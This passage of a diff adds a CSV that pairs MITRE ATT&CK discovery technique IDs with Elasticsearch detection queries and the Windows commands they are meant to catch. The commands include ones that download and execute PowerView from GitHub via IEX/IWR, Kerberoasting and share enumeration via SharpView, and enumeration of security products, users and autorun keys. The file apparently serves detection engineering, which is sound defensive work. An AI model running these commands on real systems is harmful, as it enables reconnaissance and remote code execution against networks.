+                {""match"": {""CommandLine"": ""advfirewall""}},
+                {""match_phrase"": {""CommandLine"": ""show allprofiles""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","netsh.exe advfirewall  show allprofiles 
+&& tasklist.exe 
+&& tasklist.exe | findstr /i virus 
+&& tasklist.exe | findstr /i cb 
+&& tasklist.exe | findstr /i defender 
+&& tasklist.exe | findstr /i cylance",2,
+T1518.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""SysmonDrv""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                         {""wildcard"": {""CommandLine"": ""fltmc*""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",fltmc.exe | findstr.exe 385201,2,
+T1518.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""get-process""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""virus""}},
+                        {""match"": {""CommandLine"": ""defender""}},
+                        {""match"": {""CommandLine"": ""cylance""}},
+                        {""match"":{""CommandLine"": ""carbonblack""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","get-process | ?{$_.Description -like ""*virus*""}; 
+get-process | ?{$_.Description -like ""*carbonblack*""}; 
+get-process | ?{$_.Description -like ""*defender*""}; 
+get-process | ?{$_.Description -like ""*cylance*""}",2,
+T1033,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match"":{""CommandLine"": ""whoami""}},
+                {""match_phrase"":{""CommandLine"": ""echo %username%""}},
+                {""match_phrase"":{""CommandLine"": ""whoami""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","whoami
+
+echo %username%
+
+$env:username",2,
+T1033,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""Invoke-UserHunter""}},
+                {""match_phrase"":{""CommandLine"": ""Get-NetUser""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Invoke-UserHunter -Stealth -Verbose
+
+Import-Module .\powerview.ps1 -Force;
+Get-NetUser -AdminCount | ConvertTo-Json -Depth 1
+
+Import-Module .\powerview.ps1 -Force;
+Get-NetUser -SPN | ConvertTo-Json -Depth 1",2,
+T1033,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""System.Security.Principal.WindowsIdentity""}},
+                {""wildcard"":{""CommandLine"": ""*GetCurrent""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,2,
+T1033,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""wmic* useraccount get""}},
+                {""match_phrase"": {""CommandLine"": ""quser* /SERVER""}},
+                {""match"": {""CommandLine"": ""find""}},
+                {""match_phrase"": {""CommandLine"": ""qwinsta* /server""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","cmd.exe /C whoami 
+&& wmic useraccount get /ALL 
+&& quser /SERVER:""#{computer_name}"" 
+&& quser 
+&& qwinsta.exe /server:#{computer_name} 
+&& qwinsta.exe 
+&& for /F ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt 
+&& @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",2,
+T1033,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""[System.Environment]::UserName""}},
+                  {""match"":{""CommandLine"": ""-Append""}},
+                {""match_phrase"": {""CommandLine"": ""$env:UserName""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt ; 
+$env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append",2,
+T1057,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""get-process""}},
+                {""match_phrase"":{""CommandLine"": ""wmic* process get""}},
+                {""match"":{""CommandLine"": ""tasklist""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","get-process >> $env:APPDATA\vmtools.log;
+cat $env:APPDATA\vmtools.log
+
+tasklist /m  >> $env:APPDATA\vmtool.log;
+cat $env:APPDATA\vmtool.log
+
+Get-Process
+
+tasklist
+
+wmic process get /format:list",2,
+T1057,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""get-wmiObject""}},
+                {""match_phrase"":{""CommandLine"": ""Win32_Process""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",get-wmiObject -class Win32_Process,2,
+T1057,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""foreach*""}},
+                        {""match_phrase"": {""CommandLine"": ""-eq""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""wildcard"":{""CommandLine"": ""*ProcessName""}},
+                        {""wildcard"":{""CommandLine"": ""*Owner""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$owners = @{};
+gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
+$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};
+$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq ""svchost"") {$p} };
+$valid | ConvertTo-Json
+
+$ps = get-process | select processname,Id;
+$valid = foreach($p in $ps) { if($p.ProcessName -eq ""lsass"") {$p} };
+$valid | ConvertTo-Json
+
+$owners = @{};
+gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
+$ps = get-process | select processname,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}};
+foreach($p in $ps) { if($p.Owner -eq ""#{host.user.name}"") {$p;} }",2,
+T1007,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""Get-Service""}},
+                {""match_phrase"":{""CommandLine"": ""sc query""}},
+                {""match_phrase"":{""CommandLine"": ""net* start""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-Service
+
+sc query 
+&& sc query state= all
+
+net.exe start >> C:\Windows\Temp\service-list.txt",2,
+T1201,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"":{""CommandLine"": ""get-addefaultdomainpasswordpolicy""}},
+                {""match_phrase"":{""CommandLine"": ""Get-DomainPolicy""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","get-addefaultdomainpasswordpolicy
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
+Get-DomainPolicy -verbose",2,
+T1201,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""net accounts""}},
+               {""match_phrase"":{""CommandLine"": ""/domain""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",net accounts /domain,2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"":{""CommandLine"": ""PSVersionTable""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",$PSVersionTable,2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""*OSVersion.Version""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",[environment]::OSVersion.Version,2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"":{""CommandLine"": ""cscript*""}},
+                {""wildcard"":{""CommandLine"": ""*griffon_recon*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",cscript d06deb_griffon_recon.vbs,2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match"":{""CommandLine"": ""hostname""}},
+                {""match"":{""CommandLine"": ""systeminfo""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","hostname
+
+systeminfo ",2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""reg query""}},
+                {""match_phrase"":{""CommandLine"": ""CurrentControlSet\\Services\\Disk\\Enum""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,2,
+T1082,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""reg query""}},
+                {""match_phrase"":{""CommandLine"": ""SOFTWARE\\Microsoft\\Cryptography""}},
+                {""match"":{""CommandLine"": ""MachineGuid""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,2(4),
+T1083,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""AtomicTestHarnesses""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                       {""term"":{""CommandLine"": ""pwd""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",pwd,2(4),
+T1083,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
+                        {""match"": {""CommandLine"": ""ls""}},
+                        {""match"": {""CommandLine"": ""gci""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""-Path""}},
+                        {""match"": {""CommandLine"": ""-recurse""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-ChildItem -Path #{host.system.path}
+
+ls -recurse; 
+get-childitem -recurse; 
+gci -recurse",2(4),
+T1083,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match"": {""CommandLine"": ""&gt;&gt;""}},
+                          {""match"": {""CommandLine"": ""\\download ""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                       {""match"":{""CommandLine"": ""dir""}},
+                       {""match"":{""CommandLine"": ""tree""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","dir /s c:\ >> %temp%\download 
+&& dir /s ""c:\Documents and Settings"" >> %temp%\download 
+&& dir /s ""c:\Program Files\"" >> %temp%\download 
+&& dir ""%systemdrive%\Users\*.*"" >> %temp%\download 
+&& dir ""%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> %temp%\download 
+&& dir ""%userprofile%\Desktop\*.*"" >> %temp%\download 
+&& tree /F >> %temp%\download",2(4),
+T1083,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem -Path""}},
+                          {""match_phrase"": {""CommandLine"": ""-append""}},
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"":{""CommandLine"": ""C:""}},
+                        {""match"":{""CommandLine"": ""programfiles""}},
+                        {""match_phrase"":{""CommandLine"": ""ProgramFiles(x86)""}},
+                        {""match"":{""CommandLine"": ""Desktop""}},
+                        {""match"":{""CommandLine"": ""Downloads""}},
+                        {""match_phrase"":{""CommandLine"": ""AppData/Local""}},
+                        {""match"":{""CommandLine"": ""AppData/Roaming""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$folderarray = @(""Desktop"", ""Downloads"", ""Documents"", ""AppData/Local"", ""AppData/Roaming""); 
+Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt; 
+Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt; 
+Get-ChildItem -Path ""${env:ProgramFiles(x86)}"" -erroraction silentlycontinue | Out-File -append $env:temp\T1083Test5.txt; 
+$UsersFolder = ""$env:homedrive\Users\""; 
+foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; 
+ {; 
+ foreach ($secondarydirectory in $folderarray);  
+ {Get-ChildItem -Path ""$UsersFolder/$directory/$secondarydirectory"" -ErrorAction SilentlyContinue | Out-File -append $env:temp\T1083Test5.txt};
+ }; 
+cat $env:temp\T1083Test5.txt",2(4),
+T1049,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""wildcard"":{""CommandLine"": ""netstat*""}},
+                {""match_phrase"": {""CommandLine"": ""net* use""}},
+                {""match_phrase"": {""CommandLine"": ""net* sessions""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","netstat -anto;
+
+net use
+
+net sessions",2,
+T1049,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""SharpView*""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match_phrase"":{""CommandLine"": ""Invoke-ACLScanner""}},
+                        {""match_phrase"":{""CommandLine"": ""Invoke-Kerberoast""}},
+                        {""match_phrase"":{""CommandLine"": ""Find-DomainShare""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$syntaxList = ""Invoke-ACLScanner"", ""Invoke-Kerberoast"", ""Find-DomainShare"" ; 
+foreach ($syntax in $syntaxList) {;
+ PathToAtomicsFolder\T1049\bin\SharpView.exe $syntax -}",2(4),
+T1049,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""Get-Process""}},
+                 
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-NetTCPConnection""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-NetTCPConnection,2,
+T1124,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"": {""CommandLine"": ""Get-Date""}},
+                {""match_phrase"": {""CommandLine"": ""net time \\\\localhost""}},
+                {""match_phrase"": {""CommandLine"": ""w32tm /tz""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
+
+net time \\localhost 
+
+w32tm /tz",2,
+T1217,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
+                        {""match"": {""CommandLine"": ""where""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""C:\\Users\\""}}
+                    ]
+                }
+    },
+    {""bool"": {
+                    ""should"":[
+                        {""match"": {""CommandLine"": ""Bookmarks""}},
+                        {""match_phrase"": {""CommandLine"": ""places.sqlite""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","where /R C:\Users\ Bookmarks
+
+Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force
+
+where /R C:\Users\ places.sqlite",2,
+T1217,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"":{""CommandLine"": ""dir""}},
+                {""match_phrase"": {""CommandLine"": ""%USERPROFILE%\\Favorites""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",dir /s /b %USERPROFILE%\Favorites,2(4),
+T1046,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""nmap""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",nmap 127.0.0.1,1,
+T1046,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""python""}},
+                {""match_phrase"": {""CommandLine"": ""53b103_T1046.py""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",python 53b103_T1046.py -i 127.0.0.1,1,
+T1046,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"": {""CommandLine"": ""Get-NetIPConfiguration""}},
+                {""match_phrase"": {""CommandLine"": ""Get-NetIPaddress""}},
+                {""match_phrase"": {""CommandLine"": ""Scan-Netrange""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Import-Module ./basic_scanner.ps1;
+$ports = @(22, 53, 80, 445);
+Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne ""Disconnected""} | Get-NetIPaddress -AddressFamily IPv4 | %{
+    $ipv4 = $_.IPAddress;
+    $prefixLength = $_.PrefixLength;
+    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;
+};",2,
+T1135,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                {""match_phrase"": {""CommandLine"": ""get-smbshare""}},
+                {""match_phrase"": {""CommandLine"": ""net view \\\\*""}},
+                {""match_phrase"": {""CommandLine"": ""net share""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","get-smbshare
+
+net view \\localhost
+
+net view \\#{remote.host.fqdn} /all
+
+net share",2(4),
+T1135,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Invoke-ShareFinder""}},
+                {""match_phrase"": {""CommandLine"": ""Find-DomainShare""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""-CheckShareAccess""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","if (Test-Path $env:TEMP\PowerView.ps1) { ;
+ } else {Invoke-WebRequest ""https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1"" -OutFile $env:TEMP\PowerView.ps1};  ; 
+Import-Module $env:TEMP\PowerView.ps1; 
+Invoke-ShareFinder -CheckShareAccess
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
+Find-DomainShare -CheckShareAccess -Verbose",2(14),
+T1012,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""Registry""}},
+                {""match_phrase"": {""CommandLine"": ""Select-Object""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                         {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
+                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion,,
+T1012,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""reg query""}},
+                        {""match_phrase"": {""CommandLine"": ""Winlogon""}},
+                         {""match"": {""CommandLine"": ""RunServices""}},
+                         {""match_phrase"":{""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}}
+                    ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"" 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices 
+&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices 
+&& reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" 
+&& reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"" 
+&& reg query ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" 
+&& reg query ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell"" 
+&& reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 
+&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 
+&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
+&& reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run 
+&& reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$"" 
+&& reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+c",2(4),
+T1497.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        {""match"": {""CommandLine"": ""virtual""}}
+               
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""must"":[
+                         {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
+                {""match_phrase"": {""CommandLine"": ""win32_computersystem""}},
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",get-wmiobject win32_computersystem | fl model,2(4),
+T1120,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
+                {""match_phrase"": {""CommandLine"": ""Win32_PnPEntity""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt; 
+$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt; 
+@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt",2(4),
